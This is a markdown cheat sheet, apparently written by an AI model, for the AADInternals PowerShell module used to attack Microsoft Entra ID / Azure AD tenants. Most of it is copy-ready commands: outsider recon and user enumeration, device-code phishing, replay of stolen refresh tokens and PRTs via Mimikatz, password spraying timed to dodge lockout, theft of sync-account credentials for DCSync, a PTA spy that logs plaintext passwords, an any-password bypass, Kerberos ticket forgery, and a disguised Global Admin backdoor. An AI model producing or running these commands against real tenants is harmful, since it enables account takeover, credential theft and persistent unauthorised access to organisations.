# AADInternals

**Tags:** `#aadinternals` `#azuread` `#entraid` `#cloud` `#microsoft365` `#powershell` `#enumeration` `#postexploitation`

PowerShell module for enumerating, attacking, and backdooring Azure AD / Microsoft Entra ID tenants. Covers everything from unauthenticated external recon to post-compromise backdooring, PTA agent abuse, and Azure AD Connect credential extraction. One of the primary tools for any M365/Azure engagement.

**Source:** https://github.com/Gerenios/AADInternals
**Docs:** https://aadinternals.com/aadinternals/
**Install:** `Install-Module AADInternals` or `Import-Module .\AADInternals.psd1` from the repo

```powershell
# Install from PowerShell Gallery
Install-Module AADInternals -Scope CurrentUser

# Import
Import-Module AADInternals

# Verify
Get-Command -Module AADInternals | Measure-Object   # lists all available functions
```

> [!note] **See also** — [[Entra ID]] for the broader Azure AD attack methodology, MFA bypass techniques, Conditional Access bypass, token abuse chains, and Graph API enumeration. This note covers the AADInternals module commands specifically.

---

## External Recon (No Auth Required)

```powershell
# Full tenant recon — no credentials needed
Invoke-AADIntReconAsOutsider -DomainName company.com | Format-List
# Returns: tenant name, tenant ID, auth type (Managed/Federated), MDI presence,
#          MFA methods in use, Seamless SSO status, DesktopSSO

# Check if a single user exists (no auth)
Invoke-AADIntUserEnumerationAsOutsider -UserName user@company.com

# Bulk user enumeration from file
Invoke-AADIntUserEnumerationAsOutsider -UserList users.txt

# Get all domains registered to a tenant
Get-AADIntTenantDomains -Domain company.com

# Check if Seamless SSO is enabled
Get-AADIntLoginInformation -Domain company.com | Select-Object DesktopSSOEnabled
```

---

## Authentication — Getting Tokens

AADInternals needs an access token for most operations. Multiple ways to get one depending on what you have.

```powershell
# Interactive browser login (opens browser)
$token = Get-AADIntAccessTokenForMSGraph
$tokenEXO = Get-AADIntAccessTokenForEXO        # Exchange Online
$tokenAZ = Get-AADIntAccessTokenForAzureCoreManagement  # Azure ARM

# From credentials (bypasses browser)
$creds = Get-Credential
$token = Get-AADIntAccessTokenForMSGraph -Credentials $creds

# Device code (phishing method — give the code to the target)
Get-AADIntAccessTokenForMSGraph -DeviceCode
# Outputs a user_code — victim enters at microsoft.com/devicelogin
# AADInternals polls and returns the token when they complete it

# From a stolen refresh token
$token = Get-AADIntAccessTokenForMSGraph -RefreshToken "<refresh-token>"

# From a PRT (Primary Refresh Token stolen from LSASS)
$nonce = Get-AADIntUserPRTNonce -PRTToken "<prt-base64>"
$token = Get-AADIntAccessTokenForMSGraph -PRTToken "<prt-base64>" -SessionKey "<hex-key>" -Nonce $nonce

# Cache token for reuse in the session
$token | Set-AADIntAccessToken
```

---

## Password Spraying

```powershell
# Spray via EWS (Exchange Web Services) — often bypasses Smart Lockout
Invoke-AADIntPasswordSprayEWS -UserList users.txt -Password "Spring2024!" -Verbose

# Spray via Microsoft Graph API
Invoke-AADIntPasswordSprayGraph -UserList users.txt -Password "Spring2024!"

# Spray via AD FS (federated tenants)
Invoke-AADIntPasswordSprayADFS -UserList users.txt -Password "Spring2024!" -ADFSUrl "https://sts.company.com"
```

> [!warning] **Smart Lockout** — Azure AD locks accounts after ~10 failed attempts per 60 seconds. Spray once per account per round, wait 60+ minutes between rounds. EWS endpoint can have different lockout counters than the primary endpoint.

---

## Internal Enumeration (Authenticated)

```powershell
# Set token once, all commands below use it
$token = Get-AADIntAccessTokenForMSGraph

# All users
Get-AADIntUsers -AccessToken $token | Select-Object UserPrincipalName, DisplayName, Enabled, OnPremisesSyncEnabled

# All groups
Get-AADIntGroups -AccessToken $token | Select-Object DisplayName, Id

# All service principals
Get-AADIntServicePrincipals -AccessToken $token | Select-Object DisplayName, AppId

# Full internal recon (if Global Admin)
Invoke-AADIntReconAsInsider

# Assigned directory roles (who is Global Admin, etc.)
Get-AADIntUsers -AccessToken $token | Where-Object {$_.AssignedRoles}
```

---

## Azure AD Connect Attacks

Azure AD Connect syncs on-prem AD to Entra ID. The MSOL service account has DCSync rights on-prem — compromising the Connect server = full domain + tenant control.

```powershell
# Run on the Azure AD Connect server (local admin required)
Import-Module AADInternals

# Extract MSOL service account credentials (cleartext)
Get-AADIntSyncCredentials
# Returns: MSOL username + password (use for DCSync on-prem)
# Also returns: Azure AD connector account credentials

# Use MSOL creds to DCSync from anywhere
# secretsdump.py 'corp.local/MSOL_abc123:<password>@<dc-ip>'
```

---

## Pass-Through Authentication (PTA) Agent Abuse

If the PTA agent runs on a host you control, you can intercept all authentication or accept any password.

```powershell
# Install PTA spy — logs all auth attempts (username + plaintext password) to C:\PTASpy
Install-AADIntPTASpy

# Read captured credentials
Get-AADIntPTASpyLog

# Backdoor — make PTA agent accept ANY password for any Azure AD user
Set-AADIntPTABypass -Enable $true

# Disable bypass (clean up)
Set-AADIntPTABypass -Enable $false
```

---

## PRT (Primary Refresh Token) Abuse

PRTs are issued to Azure AD-joined Windows devices. Stealing one = authenticate as the user without MFA (device compliance already satisfied).

```powershell
# PRT lives in LSASS — extract with Mimikatz first
# privilege::debug
# sekurlsa::cloudap   → outputs PRT base64 + session key hex

# Use stolen PRT to get access token (no MFA required)
$nonce = Get-AADIntUserPRTNonce -PRTToken "<prt-base64>"
$token = Get-AADIntAccessTokenForMSGraph -PRTToken "<prt-base64>" -SessionKey "<hex-sessionkey>" -Nonce $nonce

# Create SSO cookie from PRT (use in browser to bypass login)
$cookie = New-AADIntUserPRTToken -RefreshToken "<prt>" -SessionKey "<hex-key>"
# Set cookie x-ms-RefreshTokenCredential in browser → navigate to portal.azure.com
```

---

## Seamless SSO — Silver Ticket for Azure AD

If Seamless SSO is enabled, the on-prem computer account `AZUREADSSOACC$` holds a Kerberos key that can forge service tickets for Azure AD auth.

```powershell
# Requires: AZUREADSSOACC$ NTLM hash (from DCSync or secretsdump)

# Forge Kerberos ticket for any Azure AD user (including Global Admins)
New-AADIntKerberosTicket `
  -DomainName "corp.local" `
  -UserPrincipalName "globaladmin@company.com" `
  -UserSid "<user-SID>" `
  -NTLM "<AZUREADSSOACC-hash>"
```

---

## Backdooring

```powershell
# Create a new Global Admin account
New-AADIntUser -UserPrincipalName backdoor@company.com -DisplayName "IT Support" -Password "P@ssw0rd123!"
Add-AADIntGlobalAdmin -UserPrincipalName backdoor@company.com

# Reset any user's password (bypasses MFA-protected self-service reset)
Set-AADIntUserPassword -SourceAnchor "<immutable-id>" -Password "NewPass123!"

# Add credentials to a service principal (persistent access via app)
# → see Graph API section in Entra ID note for raw HTTP approach
```

---

## Useful Misc Commands

```powershell
# Get tenant ID from domain
Get-AADIntTenantID -Domain company.com

# Check if a domain is Managed or Federated
Get-AADIntLoginInformation -Domain company.com | Select-Object NameSpaceType, FederationBrandName

# Get all registered domains in a tenant
Get-AADIntTenantDomains -Domain company.com

# List conditional access policies (requires token with Policy.Read.All)
Get-AADIntConditionalAccessPolicies -AccessToken $token

# Decode any JWT access token
Read-AADIntAccessToken -AccessToken "<jwt>"
```

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
